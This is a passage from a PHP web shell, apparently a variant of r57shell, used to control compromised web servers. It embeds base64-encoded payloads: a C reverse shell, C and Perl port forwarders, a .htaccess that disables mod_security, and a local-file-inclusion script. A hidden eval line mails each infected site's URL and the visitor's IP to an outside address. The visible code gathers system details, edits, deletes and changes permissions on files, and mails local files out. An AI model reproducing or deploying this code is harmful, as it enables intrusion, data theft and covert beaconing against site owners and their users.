QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$shellvic="QWx1Q2FS==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$shell_data = "JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gJHdlYi4kaW5qOyAkYm9keSA9ICJCb3NzLCB0aGVyZSB3YXMgYW4gaW5qZWN0ZWQgdGFyZ2V0IG9uICR0YXJnZXQgYnkgJHZpc2l0b3IiOyBtYWlsKCJkYW5oY2hvaGFja0B5YWhvby5jb20iLCJGeGM5OXNoIGluamVjdGVkIHRhcmdldCBvbiBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciIsICIkYm9keSIpOyB9IGVsc2UgeyAkdmlzaXRjb3VudDsgfSBzZXRjb29raWUoInZpc2l0cyIsJHZpc2l0Y291bnQpOw=="; eval(base64_decode($shell_data));
$php_ini1="c2FmZV9tb2RlICAgICAgICAgICAgICAgPSAgICAgICBPZmY=";
$htacces="PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KICAgIFNlY0ZpbHRlckVuZ2luZSBPZmYNCiAgICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+";
$sni_res="PD8NCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXSk7DQo/Pg==";

if($unix)
 {
 if(!isset($_COOKIE['uname'])) { $uname = ex('uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }
 if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }
 if($safe_mode) { $sysctl = '-'; }
 else if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }
 else
  {
   $sysctl = ex('sysctl -n kern.ostype && sysctl -n kern.osrelease');
   if(empty($sysctl)) { $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease'); }
   if(empty($sysctl)) { $sysctl = '-'; }
   setcookie('sysctl',$sysctl);
  }
 }
 if(!isset($_COOKIE[$lang[$language.'_text137']])) {
 	$ust_u='';
 	if($unix && !$safe_mode){
 		foreach ($userful as $item) {
 			if(which($item)){$ust_u.=$item;}
 		}
 	}
 	if (@function_exists('apache_get_modules') && @in_array('mod_perl',apache_get_modules())) {$ust_u.=", mod_perl";}
 	if (@function_exists('apache_get_modules') && @in_array('mod_include',apache_get_modules())) {$ust_u.=", mod_include(SSI)";}
 	if (@function_exists('pcntl_exec')) {$ust_u.=", pcntl_exec";}
 	if (@extension_loaded('win32std')) {$ust_u.=", win32std_loaded";}
 	if (@extension_loaded('win32service')) {$ust_u.=", win32service_loaded";}
 	if (@extension_loaded('ffi')) {$ust_u.=", ffi_loaded";}
 	if (@extension_loaded('perl')) {$ust_u.=", perl_loaded";}
 	if(substr($ust_u,0,1)==",") {$ust_u[0]="";}

 	$ust_u = trim($ust_u);
 	}
 	else
 	{
 	$ust_u = trim($_COOKIE[$lang[$language.'_text137']]);
 }

 if(!isset($_COOKIE[$lang[$language.'_text138']])) {
 	$ust_d='';
 	if($unix && !$safe_mode){
 		foreach ($danger as $item) {
 			if(which($item)){$ust_d.=$item;}
 		}
 	}
 	if(!$safe_mode){
 		foreach ($danger as $item) {
 			if(ps($item)){$ust_d.=$item;}
 		}
 	}
 	if (@function_exists('apache_get_modules') && @in_array('mod_security',apache_get_modules())) {$ust_d.=", mod_security";}
 	if(substr($ust_d,0,1)==",") {$ust_d[0]="";}

 	$ust_d = trim($ust_d);
 	}else {
 	$ust_d = trim($_COOKIE[$lang[$language.'_text138']]);
 }

 if(!isset($_COOKIE[$lang[$language.'_text142']])) {

 	$select_downloaders='<select size="1" name=with>';
 	if((!@function_exists('ini_get')) || (@ini_get('allow_url_fopen') && @function_exists('file'))){$select_downloaders .= "<option value=\"fopen\">fopen</option>";$downloader="fopen";}
 	if($unix && !$safe_mode){
 		foreach ($downloaders as $item) {
 			if(which($item)){$select_downloaders .= '<option value="'.$item.'">'.$item.'</option>';$downloader.=", $item";}
 		}
 	}
 	$select_downloaders .= '</select>';
 	if(substr($downloader,0,1)==",") {$downloader[0]="";}

 	$downloader=trim($downloader);

 }else {
 	$select_downloaders = $_COOKIE['select_downloaders'];
 	$downloader = trim($_COOKIE['downloader']);
 }

echo $head;
echo '</head>';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
}
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=Black><tr><td class=main bgcolor=Black width=160><font face=Verdana size=2>'.ws(3).'<font face=Wingdings size=8 color=White><b>V</b></font><b>'.ws(3).base64_decode($shellvic).ws(3).'<font face=Wingdings size=8 color=White><b>V</b></font></b></font></td><td class=main bgcolor=Black><font face=Verdana size=-2>';
echo ws(2)."<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
if($unix)
 {
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"><b>users</b></a> ".$rb;
 }
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";
echo "</b>".ws(2);
echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: <b>".(($curl_on)?("<font color=Green>ON</font>"):("<font color=White>OFF</font>"));
echo "</b>".ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=Green>ON</font>"; } else { echo "<font color=White>OFF</font>"; }
echo "</b>".ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=Green>ON</font>";}else{echo "<font color=White>OFF</font>";}
echo "</b>".ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=Green>ON</font>";}else{echo "<font color=White>OFF</font>";}
echo "</b>".ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=Green>ON</font>";}else{echo "<font color=White>OFF</font>";}
echo "</b><br>";
echo ws(2)."Safe_mode: <b>";
echo (($safe_mode)?("<font color=Green>ON</font>"):("<font color=White>OFF</font>"));
echo "</b>".ws(2);
echo "Open_Basedir: <b>";
if($open_basedir) { if (''==($df=@ini_get('open_basedir'))) {echo "<font color=White>ini_get disable!</font></b>";}else {echo "<font color=White>$df</font></b>";};}
else {echo "<font color=green>NONE</font></b>";}
echo ws(2)."Safe_Exec_Dir: <b>";
if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_exec_dir'))) {echo "<font color=Green>NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=White>ini_get disable!</font></b>";}
echo ws(2)."Safe_Gid: <b>";
if(@function_exists('ini_get')) { if (@ini_get('safe_mode_gid')) {echo "<font color=green>ON</font></b>";}else {echo "<font color=White>OFF</font></b>";};}
else {echo "<font color=White>ini_get disable!</font></b>";}
echo ws(2)."Safe_Include_Dir: <b>";
if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_include_dir'))) {echo "<font color=Green>NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=White>ini_get disable!</font></b>";}
echo ws(2)."Sql.safe_mode: <b>";
if(@function_exists('ini_get')) { if (@ini_get('sql.safe_mode')) {echo "<font color=Green>ON</font></b>";}else {echo "<font color=White>OFF</font></b>";};}
else {echo "<font color=White>ini_get disable!</font></b>";}
echo "</b><br>".ws(2);
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=White>NONE</font></b>";}else{echo "<font color=White>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if($ust_u){echo "<br>".ws(2).$lang[$language.'_text137'].": <font color=blue>".$ust_u."</font>";};

if($ust_d){echo "<br>".ws(2).$lang[$language.'_text138'].": <font color=red>".$ust_d."</font>";};

if($downloader){echo "<br>".ws(2).$lang[$language.'_text142'].": <font color=blue>".$downloader."</font>";};
if (!$all) {$all = 0;}
echo "<br>".ws(2)."Free space : <b>".view_size($free)."</b> Total space: <b>".view_size($all)."</b>";
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=White>
<tr><td class=main align=right width=100>';
echo $font;
if($unix){
echo '<font color=White><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo '</td><td  class=main>';
echo "<font face=Verdana size=-2 color=White><b>";
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
if(!empty($id)) { echo ws(3).$id."<br>"; }
else if(function_exists('posix_geteuid') && function_exists('posix_getegid') && function_exists('posix_getgrgid') && function_exists('posix_getpwuid'))
 {
 $euserinfo  = @posix_getpwuid(@posix_geteuid());
 $egroupinfo = @posix_getgrgid(@posix_getegid());
 echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';
 }
else echo ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>";
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "</b></font>";
}
else
{
echo '<font color=White><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo '</td><td class=main>';
echo "<font face=Verdana size=-2 color=White><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@getenv("USERNAME")."<br>";

echo ws(3).$dir;
echo "<br></font>";
}
echo "</font>";
echo "</td></tr></table>";
$f = '<br>';
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$_POST['from']."\r\n");
 err(6+$res);
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {
 if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    $filename = @basename($_POST['loc_file']);
    $filedump = @fread($file,@filesize($_POST['loc_file']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=>$filename,
                    "type"=>$mime_type,
                    "content"=>$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    err(6+$res);
    $_POST['cmd']="";
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=White><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=White><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=White><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=White><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { err(1,$_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
